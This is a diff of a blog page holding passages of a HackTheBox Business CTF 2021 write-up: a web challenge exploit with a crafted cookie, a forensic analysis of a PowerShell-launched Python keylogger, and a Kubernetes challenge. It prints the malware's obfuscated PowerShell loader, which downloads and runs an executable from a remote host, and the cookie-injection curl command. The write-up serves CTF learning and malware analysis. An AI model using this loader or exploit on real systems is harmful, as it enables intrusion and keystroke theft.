@@ -337,7 +352,7 @@ eyJpdiI6Ijc2cjU4S0VHcmFqUnB5YThZZkM1c2c9PSIsInZhbHVlIjoibU9SM1ZqUTY4d0ZWcVAzWHQy
 </span><span style=color:#ae81ff></span>    -b <span style=color:#e6db74>&#34;blog_session=eyJpdiI6Ikg3bmhiWm5iSFpRK29jTjU5VDNjSGc9PSIsInZhbHVlIjoiZGswbFBGMlFSclBOOFQ1Q1J1c0dXaEtpZGtYaFJHck5vaDBUd3lRb3NXalBKMFJFTmJmY3VSSTF0TDlBMjdyZlFSZXdqR1RueVZ4REIwTkFhRFhHWHc9PSIsIm1hYyI6ImJmY2VkZmQxYmE2YTMyZDY5OGVmNDAwMjA5MzQzODY2ZTY5MzY1YWUxMDZhMzExYTIwYTkyOTI2MzE3YTJmZDQifQ%3D%3D; CHUy1XJywSReivL5QDrK8y3MhKPuH0JNbJ7kk2xB=</span><span style=color:#66d9ef>$(</span>php poc.php<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#ae81ff>\
 </span><span style=color:#ae81ff></span>    <span style=color:#e6db74>$&#39;http://142.93.38.188:31631/&#39;</span>
 </code></pre></div><p>Flag: <code>HTB{0ff_by_sl4sh_pwn4g3}</code></p>
-<h2 id=forensicsdfir>forensics/DFIR</h2>
+<h2 id=forensicsdfir>forensics/DFIR<a hidden class=anchor aria-hidden=true href=#forensicsdfir>#</a></h2>
 <ul>
 <li>Name: DFIR</li>
 <li>Category: forensics</li>
@@ -350,15 +365,15 @@ eyJpdiI6Ijc2cjU4S0VHcmFqUnB5YThZZkM1c2c9PSIsInZhbHVlIjoibU9SM1ZqUTY4d0ZWcVAzWHQy
 <p>This challenge being an OVA download started off really frustrating. In fact, <em>somehow</em> I managed to bork my local VMWare trying to import it, and when it finally did come up, the VM just never booted. So, I finally downloaded VirtualBox and with some patience, got it to boot. :( The VM would randomly lock up for a few seconds under load, or do strange things like lock up left click as if I&rsquo;m holding down the mouse button. This made for an&mldr; interesting computering experience&mldr; Anyways!</p>
 <p>The challenge description said something about windows popping up at start up, and &lsquo;lo and behold, a PowerShell window appeared during the excruciatingly slow boot of the VM. I figured the best way I would find out what may be causing that was to use the <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns>Sysinternals Autoruns</a> tool.</p>
 <p>After not too long, I spotted an oddly named Scheduled Task that runs PowerShell:</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_dfir_1.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_dfir_1.png>
 </figure>
 <p>The arguments to the invocation of PowerShell in that tiny, tiny box were:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>-w hidden -ExecutionPolicy Bypass -nop -NoExit 
 -C Write-host <span style=color:#e6db74>&#39;Windows update ready&#39;</span>; iex (<span style=color:#66d9ef>[System.Text.Encoding]</span>::UTF8.GetString(<span style=color:#66d9ef>[System.Convert]</span>::FromBase64String((Get-ItemProperty HKCU<span style=color:#960050;background-color:#1e0010>:</span>\Software\1X90wOyH).Q4josQ44)));
 </code></pre></div><p>Looked like it was reading something from the registry. Being the lazy person I am, I reused the code to get me the value it was reading:</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_dfir_2.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_dfir_2.png>
 </figure>
 <p>This time round we got some lightly obfuscated PowerShell.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>${P`ATH} = (((<span style=color:#e6db74>&#34;{9}{2}{1}{8}{5}{6}{10}{4}{3}{7}{0}{11}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;ost.&#39;</span>,<span style=color:#e6db74>&#39;gramD&#39;</span>,<span style=color:#e6db74>&#39;Pro&#39;</span>,<span style=color:#e6db74>&#39;svc&#39;</span>,<span style=color:#e6db74>&#39;ndows{0}&#39;</span>,<span style=color:#e6db74>&#39;ta{&#39;</span>,<span style=color:#e6db74>&#39;0&#39;</span>,<span style=color:#e6db74>&#39;h&#39;</span>,<span style=color:#e6db74>&#39;a&#39;</span>,<span style=color:#e6db74>&#39;C:{0}&#39;</span>,<span style=color:#e6db74>&#39;}wi&#39;</span>,<span style=color:#e6db74>&#39;exe&#39;</span>)) <span style=color:#f92672>-f</span>  <span style=color:#66d9ef>[chAR]</span>92);${e`XISTs} = .(<span style=color:#e6db74>&#34;{1}{0}{2}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;est-Pa&#39;</span>,<span style=color:#e6db74>&#39;T&#39;</span>,<span style=color:#e6db74>&#39;th&#39;</span>) -Path ${p`AtH} -PathType (<span style=color:#e6db74>&#34;{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;eaf&#39;</span>,<span style=color:#e6db74>&#39;L&#39;</span>);${Par`T1} = <span style=color:#e6db74>&#34;HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_&#34;</span>;<span style=color:#66d9ef>if</span> ( ${exi`stS} ){ &amp;(<span style=color:#e6db74>&#34;{3}{2}{1}{0}&#34;</span><span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;ess&#39;</span>,<span style=color:#e6db74>&#39;oc&#39;</span>,<span style=color:#e6db74>&#39;t-Pr&#39;</span>,<span style=color:#e6db74>&#39;Star&#39;</span>) ${pa`Th}}<span style=color:#66d9ef>else</span>{&amp;(<span style=color:#e6db74>&#34;{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;ir&#39;</span>,<span style=color:#e6db74>&#39;mkd&#39;</span>) (((<span style=color:#e6db74>&#34;{3}{5}{4}{0}{1}{2}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;Datadt&#39;</span>,<span style=color:#e6db74>&#39;Qw&#39;</span>,<span style=color:#e6db74>&#39;indows&#39;</span>,<span style=color:#e6db74>&#39;C:dtQP&#39;</span>,<span style=color:#e6db74>&#39;m&#39;</span>,<span style=color:#e6db74>&#39;rogra&#39;</span>)).<span style=color:#e6db74>&#34;rePl</span><span style=color:#ae81ff>`A</span><span style=color:#e6db74>cE&#34;</span>((<span style=color:#66d9ef>[CHAr]</span>100+<span style=color:#66d9ef>[CHAr]</span>116+<span style=color:#66d9ef>[CHAr]</span>81),<span style=color:#e6db74>&#39;\&#39;</span>));&amp;(<span style=color:#e6db74>&#34;{1}{4}{3}{0}{2}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;eb&#39;</span>,<span style=color:#e6db74>&#39;I&#39;</span>,<span style=color:#e6db74>&#39;Request&#39;</span>,<span style=color:#e6db74>&#39;voke-W&#39;</span>,<span style=color:#e6db74>&#39;n&#39;</span>) -Uri (<span style=color:#e6db74>&#34;{2}{0}{8}{3}{1}{6}{5}{4}{7}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;ttps://win&#39;</span>,<span style=color:#e6db74>&#39;eupdater&#39;</span>,<span style=color:#e6db74>&#39;h&#39;</span>,<span style=color:#e6db74>&#39;owsliv&#39;</span>,<span style=color:#e6db74>&#39;ho&#39;</span>,<span style=color:#e6db74>&#39;c&#39;</span>,<span style=color:#e6db74>&#39;.com/sv&#39;</span>,<span style=color:#e6db74>&#39;st.exe&#39;</span>,<span style=color:#e6db74>&#39;d&#39;</span>) -OutFile ${PA`TH};.(<span style=color:#e6db74>&#34;{3}{2}{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;Process&#39;</span>,<span style=color:#e6db74>&#39;-&#39;</span>,<span style=color:#e6db74>&#39;rt&#39;</span>,<span style=color:#e6db74>&#39;Sta&#39;</span>) ${p`ATh}}
@@ -382,16 +397,16 @@ ${Par`T1} = <span style=color:#e6db74>&#34;HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1
 }
 </code></pre></div><p>This snippet also gave us what looked like the first part of the flag: <code>HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_</code>. Neat, looks like there is a part 2.</p>
 <p>From here, focus shifted to that <code>svchost.exe</code> binary that lived in <code>C:\ProgramData\Windows</code>. Just running it resulted in no output, both by double clicking or running it in <code>cmd.exe</code>. I dropped the binary in <a href=https://cutter.re/>Cutter</a>, but it was pretty big.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_dfir_4.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_dfir_4.png>
 </figure>
 <p>After spending some time reversing, trying to make sense of the binary, I did come across some references to a Python VM. Geez.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_dfir_5.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_dfir_5.png>
 </figure>
 <p>At this point I figured surely, for a 2/4 difficulty challenge I don&rsquo;t have to dive this deep? So instead, I opted for some good &lsquo;ol procmon! I renamed the binary in the ProgramData folder to <code>svchost1.exe</code> to make filtering a little easier.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_dfir_6.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_dfir_6.png>
 </figure>
 <p>This time round I could see the Python usage a <em>lot</em> faster, with the added bonus of an idea where the runtime was located; <code>C:\Users\IEUser\AppData\Local\Temp\_MEI5882</code>. Many calls to read cryptography related (by name) files ending in <code>.pyd</code> were also seen.</p>
 <p>Each invocation of <code>svchost.exe</code> (or <code>svchost1.exe</code> in my renamed case) would have a new folder created in the <code>Temp\</code> directory with a similar <code>_MEI...</code> format. Anyways, with this folder in mind I copied out the files onto my host for investigation. I was a little worried here as I know it’s possible to obtain source code from Python&rsquo;s <code>.pyc</code> files, but I have not seen <code>.pyd</code>&rsquo;s before.</p>
@@ -399,8 +414,8 @@ ${Par`T1} = <span style=color:#e6db74>&#34;HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1
 <p>For plan B, I opted to get <a href=http://www.rohitab.com/apimonitor>API Monitor</a> running. Even if a Python VM was used, calls out to the Windows API would still be interesting to see with some argument data. And oh boy was it interesting. It took me a while to understand the API Monitor workflow, but before long I was able to get <code>svchost.exe</code> loaded and running.</p>
 <p>The first major observation was that not long after the process starts up, a second thread boots up. The first thread can be seen reading the <code>python37.dll</code>, where after a while <code>DllMain</code> is called. My hypothesis at this point was that the actual logic being executed would be in the second thread, with the first just being a bootstrap phase for the Python VM.</p>
 <p>The second observation was in the second thread, where a file at <code>C:\Users\IEUser\AppData\Roaming/anVzdGFuW1l.txt</code> was being referenced.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_dfir_7.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_dfir_7.png>
 </figure>
 <p>This was a new file that I had not previously discovered, so I went looking for what’s inside!</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>b&#39;sm+3e2dfsjht3Y2BgddPVlGLMtYSLuXAvcuTwGwVQQYx7mn0QZ5JxNKYBBAaLgrYeoe3OOMRv9Gm9amegVnMZfxy0Qm5OTccBs0ldLsTj8uiuHAzvT6Lo6DdSWkYjaSad0tS1TT7g3crzpLqGm3BLG2owBvbftU3uTeItXKey/KPUjgaDWMbUA9c0/jIzNM=&#39;
@@ -416,8 +431,8 @@ b&#39;sRBm6KWZigygdqvPZw==&#39;
 ...
 </code></pre></div><p>Lots of strings that appear to be base64 encoded, with a Python <a href=https://docs.python.org/3/library/stdtypes.html#bytes-objects>Bytes Object</a> <code>b''</code> in front of them. Seeing this with the crypto related files read in the earlier Procmon output made it pretty clear that these were encrypted. But how? And what <em>are</em> they?</p>
 <p>I can bore you with the details of the next section, but I&rsquo;ll skip to the chase. In my clicking around, wondering about what’s going on and what my next move could be, I notice the following in API Monitor.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_dfir_8.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_dfir_8.png>
 </figure>
 <p>A call to <code>MapVirtualKeyExW</code>!? A keylogger!? I tested a few things to make sure I wasn&rsquo;t going crazy, but yeah, this app was capturing keystrokes. Ok! Looking back at <code>anVzdGFuW1l.txt</code>, I noticed that after each press of the ENTER key, a new encrypted line would get written to the file (I used <a href=https://www.baremetalsoft.com/baretail/>baretail</a> to tail the file as I pressed keys). This didn’t get me any closer to the solve yet, but at least I have a much better idea what the application was doing, just by watching Windows API calls. Pretty cool!</p>
 <p>Eventually I wondered how they could have built the application, and it being Python and all I recalled a thing called <a href=https://www.pyinstaller.org/>Pyinstaller</a>. Essentially, you can create Windows executables from Python projects. Next, I wondered if there were tools that could extract objects/code from a Pyinstaller generated exe (assuming a bit that this was how <code>svchost.exe</code> was built), and came across a project called <a href=https://github.com/extremecoders-re/pyinstxtractor>pyinstxtractor</a>. I quickly set that up and ran it. This time round I had more python files than those I found in the <code>_MEI5882</code> temp folder! In fact, there were some <code>.pyc</code> files now!</p>
@@ -564,7 +579,7 @@ b&#39;2:dpiKey.enter&#39;
 </code></pre></div><p>Much more readable, and we can see the PIN is <code>50133700013^}</code>, which is the second part of the flag!</p>
 <p>Flag: <code>HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_50133700013}</code></p>
 <p>Crazy cool :D</p>
-<h2 id=cloudkube>cloud/Kube</h2>
+<h2 id=cloudkube>cloud/Kube<a hidden class=anchor aria-hidden=true href=#cloudkube>#</a></h2>
 <ul>
 <li>Name: Kube</li>
 <li>Category: cloud</li>
@@ -703,33 +718,47 @@ flag.txt
 # cat flag.txt
 HTB{5y573m:4N0nYM0u5}
 </code></pre></div><p>Flag: <code>HTB{5y573m:4N0nYM0u5}</code></p>
-<h1 id=conclusion>conclusion</h1>
+<h1 id=conclusion>conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h1>
 <p>We solved a lot, and this is by no means all of them, but, it&rsquo;s the ones I enjoyed!</p>
 </div>
-<div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Read other posts</span>
-<hr>
-</div>
-<div class=pagination__buttons>
-<span class="button next">
-<a href=https://leonjza.github.io/blog/2021/05/09/dawgctf-2021/>
-<span class=button__text>DawgCTF 2021</span>
-<span class=button__icon>→</span>
+<footer class=post-footer>
+<nav class=paginav>
+<a class=next href=https://leonjza.github.io/blog/2021/05/09/dawgctf-2021/>
+<span class=title>Next Page »</span>
+<br>
+<span>DawgCTF 2021</span>
 </a>
-</span>
-</div>
-</div>
-</div>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share hackthebox business ctf 2021 writeups on twitter" href="https://twitter.com/intent/tweet/?text=hackthebox%20business%20ctf%202021%20writeups&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f07%2f26%2fhackthebox-business-ctf-2021-writeups%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hackthebox business ctf 2021 writeups on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f07%2f26%2fhackthebox-business-ctf-2021-writeups%2f&title=hackthebox%20business%20ctf%202021%20writeups&summary=hackthebox%20business%20ctf%202021%20writeups&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f07%2f26%2fhackthebox-business-ctf-2021-writeups%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hackthebox business ctf 2021 writeups on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f07%2f26%2fhackthebox-business-ctf-2021-writeups%2f&title=hackthebox%20business%20ctf%202021%20writeups"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hackthebox business ctf 2021 writeups on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f07%2f26%2fhackthebox-business-ctf-2021-writeups%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hackthebox business ctf 2021 writeups on whatsapp" href="https://api.whatsapp.com/send?text=hackthebox%20business%20ctf%202021%20writeups%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f07%2f26%2fhackthebox-business-ctf-2021-writeups%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hackthebox business ctf 2021 writeups on telegram" href="https://telegram.me/share/url?text=hackthebox%20business%20ctf%202021%20writeups&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f07%2f26%2fhackthebox-business-ctf-2021-writeups%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
 </div>
 </footer>
-<script src=https://leonjza.github.io/assets/main.js></script>
-<script src=https://leonjza.github.io/assets/prism.js></script>
-</div>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
+</article>
+</main>
+<footer class=footer>
+<span>@leonjza</span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
 </body>
 </html>
